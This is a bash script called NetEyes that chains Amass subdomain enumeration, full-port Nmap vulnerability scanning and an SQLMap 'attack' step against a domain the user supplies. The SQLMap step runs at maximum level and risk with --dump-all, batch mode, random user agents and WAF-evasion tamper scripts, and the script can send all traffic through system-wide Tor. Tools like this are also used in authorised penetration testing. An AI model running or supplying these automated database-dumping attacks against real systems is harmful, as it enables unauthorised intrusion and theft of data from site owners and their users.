#!/bin/bash
# Copyright Alessandro Fiori - See Github licence and project at: https://github.com/randomtable/NetEyes

if [[ $# == 0 ]]; then
echo "NetEyes! A tool for Amass and Nmap automation. Nice to meet you! :)"
echo "Usage (commands will be executed in order - you can create a real pipeline):"
echo "-ia   			Install Amass"
echo "-in			Install Nmap"
echo "-is			Install SQLMap"
echo "-nu			Update Nmap Vulscan script and CVE Database"
echo "-ta			Activate Tor"
echo "-a=[example domain]	Scan a domain with Amass and extract IPs and Network Map (eg. -a=scanme.nmap.org)"
echo "-nvulscan			Scan extracted targets by Amass and check for vulnerabilities (Vulscan - offline script)"
echo "-nvulners			Scan extracted targets by Amass and check for vulnerabilities (Vulners - online script)"
echo "-nvulscanlite		Scan extracted targets by Amass and check for vulnerabilities (Vulscan light scan - offline script)"
echo "-nvulnerslite		Scan extracted targets by Amass and check for vulnerabilities (Vulners light scan - online script)"
echo "-sscan			Attack target hostname with SQLMap"
echo "-td			Deactivate Tor"
else
for arg in $@
do
if [[ $arg == "-ia" ]]; then
echo "Installing Amass..."
eval "sudo apt-get update && sudo apt-get install amass"
fi
if [[ $arg == *-a=* ]]; then
eval "rm -r $HOME/.config/amass"
eval "rm -r $HOME/.local/share/sqlmap"
IFS="=" read -r -a array <<< "$arg"
echo "Amass scan on target: ${array[1]}"
echo "http://${array[1]}/" >> targeturl.txt
eval "amass enum -v -src -ip -brute -min-for-recursive 2 -d ${array[1]}"
eval "amass viz -d3"
eval "\cp $HOME/.config/amass/amass_d3.html network_map.html"
iplist=$(grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" "$HOME/.config/amass/amass.json")
calculatedips=$(echo "$iplist" | xargs -n1 | sort -u | xargs)
IFS=" " read -r -a arrayips <<< "$calculatedips"
> target.txt
for i in "${arrayips[@]}"
do
if [[ $i != *.0 ]]; then
echo $i >> target.txt
fi
done
fi
if [[ $arg == "-in" ]]; then
echo "Installing Nmap..."
eval "sudo apt-get update && sudo apt-get install nmap"
fi
if [[ $arg == "-is" ]]; then
echo "Installing SQLMap..."
eval "sudo apt-get update && sudo apt-get install sqlmap"
fi
if [[ $arg == "-nu" ]]; then
echo "Updating Nmap Vulscan script and database..."
eval "sudo rm -r '/usr/share/nmap/scripts/vulscan'"
eval "sudo mkdir '/usr/share/nmap/scripts/vulscan'"
eval "sudo apt-get update && sudo apt-get install curl"
eval "sudo curl -o '/usr/share/nmap/scripts/vulscan/vulscan.nse' 'https://raw.githubusercontent.com/scipag/vulscan/master/vulscan.nse'"
eval "sudo curl -o '/usr/share/nmap/scripts/vulscan/cve.csv' 'https://cve.mitre.org/data/downloads/allitems.csv'"
fi
if [[ $arg == "-nvulscan" ]]; then
eval "nmap -p0-65535 -sT -sV -Pn -oA result_vulscan --script=vulscan/vulscan.nse --script-args vulscancorrelation=1 --version-intensity 0 -iL target.txt"
eval "nmap -p0-65535 -6 -sT -sV -Pn -oA result_6_vulscan --script=vulscan/vulscan.nse --script-args vulscancorrelation=1 --version-intensity 0 -iL target.txt"
fi
if [[ $arg == "-nvulscanlite" ]]; then
eval "nmap -p0-1024 -sT -sV -Pn -oA result_vulscan --script=vulscan/vulscan.nse --script-args vulscancorrelation=1 --version-intensity 0 -iL target.txt"
eval "nmap -p0-1024 -6 -sT -sV -Pn -oA result_6_vulscan --script=vulscan/vulscan.nse --script-args vulscancorrelation=1 --version-intensity 0 -iL target.txt"
fi
if [[ $arg == "-nvulners" ]]; then
echo "Launching Nmap scan against extracted targets..."
eval "nmap -p0-65535 -sT -sV -Pn -oA result_vulners --script vulners --version-intensity 0 -iL target.txt"
eval "nmap -p0-65535 -6 -sT -sV -Pn -oA result_6_vulners --script vulners --version-intensity 0 -iL target.txt"
fi
if [[ $arg == "-nvulnerslite" ]]; then
echo "Launching Nmap scan against extracted targets..."
eval "nmap -p0-1024 -sT -sV -Pn -oA result_vulners --script vulners --version-intensity 0 -iL target.txt"
eval "nmap -p0-1024 -6 -sT -sV -Pn -oA result_6_vulners --script vulners --version-intensity 0 -iL target.txt"
fi
if [[ $arg == "-ta" ]]; then
echo "Activating system-wide Tor..."
eval "sudo apt-get update && sudo apt-get install git"
eval "git clone https://github.com/ericpaulbishop/iptables_torify.git Tor"
eval "cd Tor/ && sudo ./debian_install.sh"
fi
if [[ $arg == "-sscan" ]]; then
echo "Attacking the target with SQLMap..."
eval "sqlmap -m targeturl.txt --crawl=10 --level=5 --risk=3 -a --dump-all --batch --random-agent --tamper=apostrophemask,apostrophenullencode,between,charencode"
eval "sqlmap -m targeturl.txt --crawl=10 --level=5 --risk=3 -a --dump-all --batch --random-agent --forms --tamper=apostrophemask,apostrophenullencode,between,charencode"
fi
if [[ $arg == "-td" ]]; then
echo "Deactivating system-wide Tor..."
eval "sudo apt-get update && sudo apt-get install git"
eval "git clone https://github.com/ericpaulbishop/iptables_torify.git Tor"
eval "cd Tor/ && sudo ./debian_install.sh && sudo /etc/init.d/torify stop"
fi
done
fi